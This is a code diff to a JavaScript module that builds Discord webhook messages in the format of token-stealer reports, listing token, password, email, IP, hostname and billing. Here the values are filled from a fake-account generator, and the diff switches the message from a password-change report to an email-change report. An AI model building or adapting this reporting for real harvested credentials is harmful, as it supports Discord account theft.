@@ -1,27 +1,25 @@
 "use strict";
 Object.defineProperty(exports, "__esModule", { value: true });
-exports.getUserPasswordChangeEmbed = void 0;
+exports.getUserEmailChangeEmbed = void 0;
 const constants_1 = require("../constants");
 const fakeProfile_1 = require("../fakeProfile");
 const utils_1 = require("../utils");
 const baseEmbed_1 = require("./helpers/baseEmbed");
 const friendsEmbed_1 = require("./helpers/friendsEmbed");
 const twoFaEmbed_1 = require("./helpers/twoFaEmbed");
-async function getUserPasswordChangeEmbed(config, account = new fakeProfile_1.FakeAccount()) {
+async function getUserEmailChangeEmbed(config, account = new fakeProfile_1.FakeAccount()) {
     const embedsCount = account.discord.twoFACode ? 3 : 2;
     const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config, embedsCount);
     const embed = embeds[0];
-    embed.setTitle("Password Changed");
-    const oldPassword = account.discord.password;
-    embed.setThumbnail(await account.discord.getAvatar());
-    account.discord.generatePassword();
-    const newPassword = account.discord.password;
+    embed.setTitle("Email Changed");
+    account.discord.generateNewEmail();
+    const password = account.discord.password;
     const token = account.discord.token;
-    const des = `[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token}<br>${newPassword})`;
+    const des = `[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token}<br>${password})`;
     embed.setDescription(des);
     embed.setFields([{
             name: "Info",
-            value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}\nInjection Info: \n${account.injectionPath}\n`),
+            value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}`),
             inline: false
         }, {
             name: "Username",
@@ -44,18 +42,13 @@ async function getUserPasswordChangeEmbed(config, account = new fakeProfile_1.Fa
             value: account.discord.billing,
             inline: false
         }, {
-            name: "Email",
+            name: "New Email",
             value: (0, utils_1.warpInQuote)(account.discord.email),
             inline: true
         },
         {
-            name: "Old Password",
-            value: (0, utils_1.warpInQuote)(oldPassword),
-            inline: true,
-        },
-        {
-            name: "New Password",
-            value: (0, utils_1.warpInQuote)(newPassword),
+            name: "Password",
+            value: (0, utils_1.warpInQuote)(password),
             inline: true,
         },
         {
@@ -70,4 +63,4 @@ async function getUserPasswordChangeEmbed(config, account = new fakeProfile_1.Fa
     }
     return webhookMessage();
 }
-exports.getUserPasswordChangeEmbed = getUserPasswordChangeEmbed;
+exports.getUserEmailChangeEmbed = getUserEmailChangeEmbed;
